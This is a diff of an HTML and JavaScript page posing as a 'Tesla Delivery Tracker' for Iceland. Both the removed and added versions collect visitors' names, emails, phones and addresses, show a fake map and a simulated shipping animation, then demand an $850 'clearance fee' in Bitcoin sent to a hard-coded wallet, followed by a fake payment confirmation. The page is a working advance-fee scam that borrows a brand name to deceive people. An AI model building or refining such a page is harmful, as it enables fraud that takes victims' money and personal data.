+        text-align: left;
+      }
+
+      .confirmation-actions {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="main-container">
-    <!-- Header with Step Indicator -->
-    <div class="header">
-      <div class="header-content">
-        <div class="logo">
-          <span>⚡</span>
-          <span>TESLA DELIVERY</span>
-        </div>
-        <ul class="step-indicator" id="stepIndicator">
-          <li class="active" data-step="1">
-            <span class="step-dot">1</span>
-            <span>Welcome</span>
-          </li>
-          <li data-step="2">
-            <span class="step-dot">2</span>
-            <span>Register</span>
-          </li>
-          <li data-step="3">
-            <span class="step-dot">3</span>
-            <span>Track</span>
-          </li>
-          <li data-step="4">
-            <span class="step-dot">4</span>
-            <span>Payment</span>
-          </li>
-          <li data-step="5">
-            <span class="step-dot">5</span>
-            <span>Complete</span>
-          </li>
-        </ul>
-      </div>
-    </div>
-
-    <!-- Content Area -->
-    <div class="content">
-
-      <!-- Step 1: Welcome Page -->
-      <div id="page-welcome" class="page active">
-        <div class="welcome-content">
-          <div class="tesla-icon">⚡</div>
-          <h1>Tesla Model Delivery</h1>
-          <p>Iceland International Delivery Service</p>
-          <p class="subtitle">Fast, Secure, and Professional</p>
-          <div class="button-group">
-            <button class="btn-primary" onclick="goToStep(2)">Get Started</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 2: Registration Page -->
-      <div id="page-registration" class="page">
-        <h2 class="page-title">Complete Your Profile</h2>
-        <p class="page-subtitle">We need some information to process your delivery</p>
-        
-        <div id="registrationError" class="error-message" style="display: none;"></div>
-
-        <form id="registrationForm">
-          <div class="form-row">
-            <div class="form-group">
-              <label for="fullName">Full Name <span>*</span></label>
-              <input type="text" id="fullName" placeholder="John Doe" required>
-              <span class="error-text">Please enter a valid name (minimum 3 characters)</span>
-            </div>
-            <div class="form-group">
-              <label for="email">Email Address <span>*</span></label>
-              <input type="email" id="email" placeholder="john@example.com" required>
-              <span class="error-text">Please enter a valid email address</span>
-            </div>
-          </div>
-
-          <div class="form-row">
-            <div class="form-group">
-              <label for="phone">Contact Number <span>*</span></label>
-              <input type="tel" id="phone" placeholder="+354 XXX XXXX" required>
-              <span class="error-text">Please enter a valid contact number</span>
-            </div>
-            <div class="form-group">
-              <label for="trackingNumber">Tracking Number <span>*</span></label>
-              <input type="text" id="trackingNumber" placeholder="TM2022ICELAND" required>
-              <span class="error-text">Tracking number is required</span>
-            </div>
-          </div>
-
-          <div class="form-group">
-            <label for="address">Delivery Address in Iceland <span>*</span></label>
-            <textarea id="address" placeholder="Street address, postal code, city, Iceland" required></textarea>
-            <span class="error-text">Please enter a valid address (minimum 10 characters)</span>
-          </div>
-
-          <div class="button-group">
-            <button type="button" class="btn-secondary" onclick="goToStep(1)">Back</button>
-            <button type="button" class="btn-primary" onclick="submitRegistration()">Continue</button>
-          </div>
-        </form>
-      </div>
-
-      <!-- Step 3: Tracking Page -->
-      <div id="page-tracking" class="page">
-        <div>
-          <div class="map-container">
-            <iframe id="mapFrame" src="https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9" allowfullscreen="" loading="lazy"></iframe>
-          </div>
-          <p style="color: #888; margin-top: 15px; text-align: center; font-size: 0.95em;">
-            🚗 Tesla Model in transit from Tesla Factory to Iceland
-          </p>
-        </div>
-
-        <div class="tracking-details">
-          <h3>Delivery Status</h3>
-          
-          <div class="detail-item">
-            <div class="detail-label">Recipient</div>
-            <div class="detail-value" id="trackingName">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Email</div>
-            <div class="detail-value" id="trackingEmail">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Contact</div>
-            <div class="detail-value" id="trackingPhone">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Destination</div>
-            <div class="detail-value" id="trackingAddress">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Status</div>
-            <div>
-              <span class="status-badge">IN TRANSIT</span>
-            </div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Estimated Arrival</div>
-            <div class="detail-value">72-96 Hours</div>
-          </div>
-
-          <div class="button-group" style="margin-top: 30px;">
-            <button type="button" class="btn-secondary" onclick="goToStep(2)">Back</button>
-            <button type="button" class="btn-primary" onclick="goToStep(4)">Next: Payment</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 4: Payment Page -->
-      <div id="page-payment" class="page">
-        <h2 class="page-title" style="text-align: center;">Payment Required</h2>
-        <p class="page-subtitle" style="text-align: center;">Complete the clearance fee to finalize delivery</p>
-
-        <div class="payment-card">
-          <h2>Clearance Fee</h2>
-          <div class="fee-amount">$850 USD</div>
-          <div class="fee-description">
-            A clearance and handling fee is required to complete the international delivery to Iceland and customs processing.
-          </div>
-
-          <div class="wallet-section">
-            <div class="wallet-label">Bitcoin Wallet Address</div>
-            <div class="wallet-address" onclick="copyToClipboard(this)">
-              bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc
-            </div>
-            <button type="button" class="copy-btn" onclick="copyToClipboard(document.querySelector('.wallet-address'))">
-              Copy Address
-            </button>
-          </div>
-
-          <div class="info-box">
-            <strong>⚠️ Payment Instructions:</strong>
-            <p style="margin-top: 10px;">
-              1. Copy the wallet address or scan the QR code<br>
-              2. Send exactly <strong>$850 USD</strong> in Bitcoin<br>
-              3. Save your transaction receipt<br>
-              4. Upload the payment proof to continue
-            </p>
-          </div>
-
-          <div class="wallet-section">
-            <div class="wallet-label">Delivery Details</div>
-            <div style="color: #ccc; font-size: 0.95em; line-height: 1.8;">
-              <strong>Recipient:</strong> <span id="paymentName">-</span><br>
-              <strong>Email:</strong> <span id="paymentEmail">-</span><br>
-              <strong>Phone:</strong> <span id="paymentPhone">-</span><br>
-              <strong>Address:</strong> <span id="paymentAddress">-</span>
-            </div>
-          </div>
-        </div>
-
-        <div class="payment-card" style="border-color: #2ecc71;">
-          <h2 style="color: #2ecc71;">Upload Payment Proof</h2>
-          <div class="upload-section" onclick="document.getElementById('paymentFile').click()">
-            <p style="font-size: 2em;">📸</p>
-            <p><strong>Click to upload your payment screenshot</strong></p>
-            <p>or drag and drop</p>
-            <p style="font-size: 0.85em; color: #666;">Supported formats: JPG, PNG, GIF</p>
-            <input type="file" id="paymentFile" accept="image/*" onchange="previewPaymentImage()">
-          </div>
-
-          <div id="imagePreview" class="screenshot-preview" style="display: none;">
-            <img id="previewImg" src="" alt="Payment Receipt">
-          </div>
-        </div>
-
-        <div class="button-group">
-          <button type="button" class="btn-secondary" onclick="goToStep(3)">Back</button>
-          <button type="button" class="btn-primary" id="submitPaymentBtn" onclick="submitPayment()" disabled>
-            Verify Payment
-          </button>
-        </div>
-      </div>
-
-      <!-- Step 5: Confirmation Page -->
-      <div id="page-confirmation" class="page">
-        <div class="success-icon">✅</div>
-        <div class="success-title">Payment Verified</div>
-        <div class="success-message">
-          Your payment has been successfully processed. Your Tesla Model delivery is now in final stage and heading to your Iceland address.
-        </div>
-
-        <div class="confirmation-details">
-          <div class="detail-item">
-            <div class="detail-label">Recipient</div>
-            <div class="detail-value" id="confirmName">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Email</div>
-            <div class="detail-value" id="confirmEmail">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Delivery Address</div>
-            <div class="detail-value" id="confirmAddress">-</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Vehicle</div>
-            <div class="detail-value">2022 Tesla Model</div>
-          </div>
-
-          <div class="detail-item">
-            <div class="detail-label">Expected Delivery</div>
-            <div class="detail-value">48-72 Hours</div>
-          </div>
-        </div>
-
-        <div id="confirmImagePreview" class="screenshot-preview">
-          <img id="confirmImg" src="" alt="Payment Confirmation">
-        </div>
-
-        <div class="support-banner">
-          <h4>Need Assistance?</h4>
-          <p>Our support team is available 24/7 to help with your delivery</p>
-          <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank">
-            💬 Contact Support
-          </a>
-        </div>
-
-        <div class="button-group">
-          <button type="button" class="btn-success" onclick="goToStep(1)">Start New Delivery</button>
-        </div>
-      </div>
-
-    </div>
-
-    <!-- Footer -->
-    <div class="footer">
-      <div class="footer-content">
-        <p>© 2026 Tesla International Delivery Service | <a href="#" onclick="event.preventDefault(); alert('Privacy Policy')">Privacy Policy</a> | <a href="#" onclick="event.preventDefault(); alert('Terms & Conditions')">Terms & Conditions</a></p>
-        <p style="margin-top: 10px;">For support: <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank">Live Chat 24/7</a></p>
+  <!-- NAVIGATION BAR -->
+  <div class="navbar">
+    <div class="navbar-content">
+      <div class="logo">⚡ TESLA TRACKER</div>
+      <div class="nav-links">
+        <span class="nav-status" id="navStatus">Status: Initialization</span>
+        <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
+           target="_blank" class="support-btn">Support</a>
       </div>
     </div>
   </div>
 
+  <!-- MAIN CONTAINER -->
+  <div class="main-container">
+
+    <!-- PAGE 1: SPLASH SCREEN -->
+    <div class="page active" id="page-splash">
+      <div class="splash-content">
+        <div class="splash-logo">⚡</div>
+        <h1 class="splash-title">Tesla Delivery Tracker</h1>
+        <p class="splash-subtitle">Professional Fleet Tracking for Iceland</p>
+        <button class="splash-btn" onclick="goToPage('registration')">Start Tracking</button>
+      </div>
+    </div>
+
+    <!-- PAGE 2: REGISTRATION -->
+    <div class="page" id="page-registration">
+      <div class="registration-container">
+        <div class="reg-header">
+          <h1>📋 Registration</h1>
+          <p>Complete your profile to begin tracking</p>
+        </div>
+
+        <form id="registrationForm" onsubmit="submitRegistration(event)">
+          <div class="form-row">
+            <div class="form-group">
+              <label for="fullName">Full Name</label>
+              <input type="text" id="fullName" placeholder="John Doe" required />
+              <span class="error-text">At least 3 characters required</span>
+            </div>
+            <div class="form-group">
+              <label for="email">Email Address</label>
+              <input type="email" id="email" placeholder="john@example.com" required />
+              <span class="error-text">Valid email required</span>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="phone">Contact Number</label>
+              <input type="tel" id="phone" placeholder="+354 XXX XXXX" required />
+              <span class="error-text">Valid phone number required</span>
+            </div>
+            <div class="form-group">
+              <label for="trackingNumber">Tracking Number</label>
+              <input type="text" id="trackingNumber" placeholder="TM2022ICELAND" required />
+              <span class="error-text">Tracking number required</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="address">Iceland Delivery Address</label>
+            <textarea id="address" placeholder="Street address, postal code, city, Iceland" required></textarea>
+            <span class="error-text">Valid address required (minimum 10 characters)</span>
+          </div>
+
+          <div class="form-actions">
+            <button type="button" class="btn-secondary" onclick="goToPage('splash')">Back</button>
+            <button type="submit" class="btn-primary">Continue</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- PAGE 3: TRACKING SELECTION -->
+    <div class="page" id="page-tracking-select">
+      <div class="tracking-select-container">
+        <h1>🚗 Start Tracking</h1>
+        <p>Your tracking information has been verified</p>
+        <p style="color: #dc143c; font-weight: 700;">Ready to track your Tesla delivery?</p>
+
+        <input type="text" class="tracking-input" id="trackingDisplay" disabled />
+
+        <div class="tracking-buttons">
+          <button class="btn-secondary" onclick="goToPage('registration')">Back</button>
+          <button class="btn-primary" onclick="goToPage('map')">Start Live Tracking</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE 4: LIVE TRACKING MAP -->
+    <div class="page" id="page-map">
+      <div class="progress-bar">
+        <div class="progress-fill" style="width: 50%;"></div>
+      </div>
+
+      <div class="map-container">
+        <iframe src="https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9" allowfullscreen="" loading="lazy"></iframe>
+      </div>
+
+      <div class="tracking-status">
+        <div class="status-item">
+          <div class="status-label">📍 Current Location</div>
+          <div class="status-value" id="statusLocation">Tesla Factory</div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">⏱️ Estimated Time</div>
+          <div class="status-value" id="statusTime">72-96 Hours</div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">🚗 Vehicle Status</div>
+          <div class="status-value" id="statusVehicle">In Transit</div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">📦 Package Status</div>
+          <div class="status-value" id="statusPackage">Secured</div>
+        </div>
+      </div>
+
+      <div class="tracking-actions">
+        <button class="btn-secondary" onclick="goToPage('tracking-select')">Back</button>
+        <button class="btn-continue" onclick="simulateTracking()">Simulate Progress</button>
+        <button class="btn-primary" onclick="goToPage('payment')">Proceed to Payment</button>
+      </div>
+    </div>
+
+    <!-- PAGE 5: PAYMENT -->
+    <div class="page" id="page-payment">
+      <div class="progress-bar">
+        <div class="progress-fill" style="width: 75%;"></div>
+      </div>
+
+      <div class="payment-content">
+        <div class="payment-header">
+          <h1>💳 Payment & Clearance</h1>
+          <p>Complete the clearance payment to finalize delivery</p>
+        </div>
+
+        <div class="payment-grid">
+          <!-- Payment Information -->
+          <div class="payment-card">
+            <h2>💰 Payment Details</h2>
+
+            <div class="payment-info">
+              <p>
+                <span class="payment-info-label">Clearance Fee</span>
+                <span class="payment-info-value">$850 USD</span>
+              </p>
+              <p>
+                <span class="payment-info-label">Method</span>
+                <span class="payment-info-value">Bitcoin</span>
+              </p>
+              <p>
+                <span class="payment-info-label">Currency</span>
+                <span class="payment-info-value">BTC</span>
+              </p>
+            </div>
+
+            <div style="background: #0f0f0f; padding: 15px; border-radius: 8px; text-align: left;">
+              <p style="color: #999; font-size: 0.85em; text-transform: uppercase; margin-bottom: 10px;">Bitcoin Wallet Address</p>
+              <div class="wallet-address">
+                bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc
+              </div>
+              <button class="copy-btn" onclick="copyToClipboard('bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc')">
+                📋 Copy Address
+              </button>
+            </div>
+          </div>
+
+          <!-- Recipient Information -->
+          <div class="payment-card">
+            <h2>📮 Recipient Info</h2>
+
+            <div class="recipient-card">
+              <h3>Delivery Details</h3>
+              <div class="recipient-info">
+                <p>
+                  <span class="recipient-label">Name:</span><br/>
+                  <span id="recipientName" style="color: #fff; font-weight: 600;">—</span>
+                </p>
+                <p>
+                  <span class="recipient-label">Email:</span><br/>
+                  <span id="recipientEmail" style="color: #fff; font-weight: 600;">—</span>
+                </p>
+                <p>
+                  <span class="recipient-label">Phone:</span><br/>
+                  <span id="recipientPhone" style="color: #fff; font-weight: 600;">—</span>
+                </p>
+                <p>
+                  <span class="recipient-label">Address:</span><br/>
+                  <span id="recipientAddress" style="color: #fff; font-weight: 600;">—</span>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="warning-box">
+          <strong>⚠️ Important Notice</strong>
+          <p>Please ensure you have sufficient Bitcoin balance. The payment is required for customs clearance and final delivery to Iceland. Once confirmed, your Tesla Model will proceed immediately to your delivery address.</p>
+        </div>
+
+        <div class="payment-actions">
+          <div class="btn-file-upload">
+            <input type="file" id="paymentFile" accept="image/*" onchange="handleFileUpload()" />
+            <label for="paymentFile">📸 Upload Payment Proof</label>
+            <div class="file-name" id="fileName"></div>
+          </div>
+          <button class="btn-primary" onclick="processPayment()" id="payBtn">Proceed to Confirmation</button>
+        </div>
+
+        <button class="btn-secondary" style="width: 100%; margin-top: 15px;" onclick="goToPage('map')">Back to Tracking</button>
+      </div>
+    </div>
+
+    <!-- PAGE 6: CONFIRMATION -->
+    <div class="page" id="page-confirmation">
+      <div class="progress-bar">
+        <div class="progress-fill" style="width: 100%;"></div>
+      </div>
+
+      <div class="confirmation-container">
+        <div class="success-badge">✅</div>
+        <h1 class="confirmation-title">Payment Confirmed</h1>
+        <p class="confirmation-subtitle">Your Tesla Model delivery is now in final processing stage. Customs clearance is complete.</p>
+
+        <div class="confirmation-details">
+          <div class="detail-row">
+            <span class="detail-label">📦 Vehicle</span>
+            <span class="detail-value">2022 Tesla Model</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">💳 Clearance Fee</span>
+            <span class="detail-value">$850 USD</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">📍 Destination</span>
+            <span class="detail-value" id="confirmAddress">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">👤 Recipient</span>
+            <span class="detail-value" id="confirmName">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">📧 Contact Email</span>
+            <span class="detail-value" id="confirmEmail">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">⏱️ Delivery Time</span>
+            <span class="detail-value">48-72 Hours</span>
+          </div>
+        </div>
+
+        <img id="confirmImage" class="confirmation-image" src="" alt="Payment Confirmation" />
+
+        <div class="confirmation-actions">
+          <button class="btn-finish" onclick="completeTracking()">Complete Tracking</button>
+        </div>
+
+        <div class="support-contact">
+          <p>Questions about your delivery? Our support team is ready to help.</p>
+          <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
+             target="_blank">💬 Contact Support 24/7</a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
   <script>
-    let userDataCache = {};
+    let userCache = {};
     let currentStep = 1;
-    const validTrackingNumber = "TM2022ICELAND";
+    const validTracking = 'TM2022ICELAND';
 
-    function goToStep(step) {
-      // Hide all pages
-      document.querySelectorAll('.page').forEach(page => {
-        page.classList.remove('active');
-      });
+    // Page Navigation
+    function goToPage(pageId) {
+      const pages = document.querySelectorAll('.page');
+      pages.forEach(page => page.classList.remove('active'));
+      document.getElementById(`page-${pageId}`).classList.add('active');
+      updateProgress(pageId);
+      updateNavStatus(pageId);
+      window.scrollTo(0, 0);
+    }
 
-      // Update step indicator
-      document.querySelectorAll('.step-indicator li').forEach(li => {
-        li.classList.remove('active', 'completed');
-        if (parseInt(li.dataset.step) < step) {
-          li.classList.add('completed');
-        } else if (parseInt(li.dataset.step) === step) {
-          li.classList.add('active');
-        }
-      });
-
-      // Show current page
-      const pageId = `page-${getPageName(step)}`;
-      const page = document.getElementById(pageId);
-      if (page) {
-        page.classList.add('active');
-        currentStep = step;
-
-        // Populate data if moving to tracking, payment or confirmation
-        if (step === 3) populateTrackingData();
-        if (step === 4) populatePaymentData();
-        if (step === 5) populateConfirmationData();
-
-        // Scroll to top
-        window.scrollTo(0, 0);
+    // Progress Bar Update
+    function updateProgress(pageId) {
+      const progressMap = {
+        'splash': 0,
+        'registration': 20,
+        'tracking-select': 40,
+        'map': 50,
+        'payment': 75,
+        'confirmation': 100
+      };
+      const progressFill = document.querySelector('.progress-fill');
+      if (progressFill) {
+        progressFill.style.width = (progressMap[pageId] || 0) + '%';
       }
     }
 
-    function getPageName(step) {
-      const pages = {
-        1: 'welcome',
-        2: 'registration',
-        3: 'tracking',
-        4: 'payment',
-        5: 'confirmation'
+    // Navigation Status Update
+    function updateNavStatus(pageId) {
+      const statusMap = {
+        'splash': 'Initialization',
+        'registration': 'Registration',
+        'tracking-select': 'Verification',
+        'map': 'Live Tracking',
+        'payment': 'Payment Processing',
+        'confirmation': 'Confirmed'
       };
-      return pages[step];
+      document.getElementById('navStatus').textContent = 'Status: ' + (statusMap[pageId] || 'Tracking');
     }
 
+    // Form Validation
     function validateEmail(email) {
       return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
     }
@@ -1104,7 +1267,7 @@
 
       let isValid = true;
 
-      // Clear previous errors
+      // Clear errors
       document.querySelectorAll('.error-text').forEach(el => el.style.display = 'none');
       document.querySelectorAll('input, textarea').forEach(el => el.classList.remove('error'));
 
@@ -1141,89 +1304,105 @@
       return isValid;
     }
 
-    function submitRegistration() {
-      if (!validateForm()) {
-        document.getElementById('registrationError').textContent = '❌ Please fix the errors above';
-        document.getElementById('registrationError').style.display = 'block';
-        return;
-      }
+    // Submit Registration
+    function submitRegistration(event) {
+      event.preventDefault();
 
-      const trackingNumber = document.getElementById('trackingNumber').value.trim();
-      if (trackingNumber !== validTrackingNumber) {
-        document.getElementById('registrationError').textContent = '❌ Invalid tracking number. Please enter: TM2022ICELAND';
-        document.getElementById('registrationError').style.display = 'block';
-        return;
-      }
+      if (!validateForm()) return;
 
-      userDataCache = {
+      userCache = {
         fullName: document.getElementById('fullName').value.trim(),
         email: document.getElementById('email').value.trim(),
         phone: document.getElementById('phone').value.trim(),
         address: document.getElementById('address').value.trim(),
-        trackingNumber: trackingNumber
+        trackingNumber: document.getElementById('trackingNumber').value.trim()
       };
 
-      document.getElementById('registrationError').style.display = 'none';
-      goToStep(3);
+      document.getElementById('trackingDisplay').value = userCache.trackingNumber;
+      goToPage('tracking-select');
     }
 
-    function populateTrackingData() {
-      document.getElementById('trackingName').textContent = userDataCache.fullName || '-';
-      document.getElementById('trackingEmail').textContent = userDataCache.email || '-';
-      document.getElementById('trackingPhone').textContent = userDataCache.phone || '-';
-      document.getElementById('trackingAddress').textContent = userDataCache.address || '-';
+    // Simulate Tracking Progress
+    function simulateTracking() {
+      const locations = ['Tesla Factory', 'En Route - Europe', 'Over Atlantic', 'Approaching Iceland', 'Final Approach'];
+      const statuses = ['In Transit', 'In Transit', 'In Transit', 'Landing Procedures', 'Ready for Delivery'];
+      
+      let index = 0;
+      const interval = setInterval(() => {
+        if (index < locations.length) {
+          document.getElementById('statusLocation').textContent = locations[index];
+          document.getElementById('statusVehicle').textContent = statuses[index];
+          index++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 1500);
     }
 
-    function populatePaymentData() {
-      document.getElementById('paymentName').textContent = userDataCache.fullName || '-';
-      document.getElementById('paymentEmail').textContent = userDataCache.email || '-';
-      document.getElementById('paymentPhone').textContent = userDataCache.phone || '-';
-      document.getElementById('paymentAddress').textContent = userDataCache.address || '-';
+    // Copy to Clipboard
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert('Bitcoin address copied to clipboard!');
+      });
     }
 
-    function populateConfirmationData() {
-      document.getElementById('confirmName').textContent = userDataCache.fullName || '-';
-      document.getElementById('confirmEmail').textContent = userDataCache.email || '-';
-      document.getElementById('confirmAddress').textContent = userDataCache.address || '-';
-    }
-
-    function previewPaymentImage() {
-      const fileInput = document.getElementById('paymentFile');
-      if (fileInput.files[0]) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          document.getElementById('previewImg').src = e.target.result;
-          document.getElementById('imagePreview').style.display = 'block';
-          document.getElementById('submitPaymentBtn').disabled = false;
-        };
-        reader.readAsDataURL(fileInput.files[0]);
+    // Handle File Upload
+    function handleFileUpload() {
+      const file = document.getElementById('paymentFile').files[0];
+      if (file) {
+        document.getElementById('fileName').textContent = '✓ File selected: ' + file.name;
       }
     }
 
-    function submitPayment() {
-      if (!document.getElementById('paymentFile').files[0]) {
-        alert('Please upload a payment screenshot');
+    // Process Payment
+    function processPayment() {
+      const file = document.getElementById('paymentFile').files[0];
+      if (!file) {
+        alert('Please upload a payment proof screenshot');
         return;
       }
 
       const reader = new FileReader();
       reader.onload = function(e) {
-        document.getElementById('confirmImg').src = e.target.result;
-        goToStep(5);
+        populateConfirmation(e.target.result);
+        goToPage('confirmation');
       };
-      reader.readAsDataURL(document.getElementById('paymentFile').files[0]);
+      reader.readAsDataURL(file);
     }
 
-    function copyToClipboard(element) {
-      const text = element.textContent.trim();
-      navigator.clipboard.writeText(text).then(() => {
-        const originalText = element.textContent;
-        element.textContent = '✓ Copied!';
-        setTimeout(() => {
-          element.textContent = originalText;
-        }, 2000);
-      });
+    // Populate Confirmation
+    function populateConfirmation(imageData) {
+      document.getElementById('recipientName').textContent = userCache.fullName;
+      document.getElementById('recipientEmail').textContent = userCache.email;
+      document.getElementById('recipientPhone').textContent = userCache.phone;
+      document.getElementById('recipientAddress').textContent = userCache.address;
+
+      document.getElementById('confirmName').textContent = userCache.fullName;
+      document.getElementById('confirmAddress').textContent = userCache.address;
+      document.getElementById('confirmEmail').textContent = userCache.email;
+      document.getElementById('confirmImage').src = imageData;
     }
+
+    // Complete Tracking
+    function completeTracking() {
+      alert('Thank you for using Tesla Delivery Tracker! Your vehicle will arrive within 48-72 hours. You will receive updates via email at: ' + userCache.email);
+      goToPage('splash');
+      resetForm();
+    }
+
+    // Reset Form
+    function resetForm() {
+      document.getElementById('registrationForm').reset();
+      document.getElementById('paymentFile').value = '';
+      document.getElementById('fileName').textContent = '';
+      userCache = {};
+    }
+
+    // Initialize
+    window.onload = () => {
+      updateProgress('splash');
+      updateNavStatus('splash');
+    };
   </script>
 </body>
 </html>
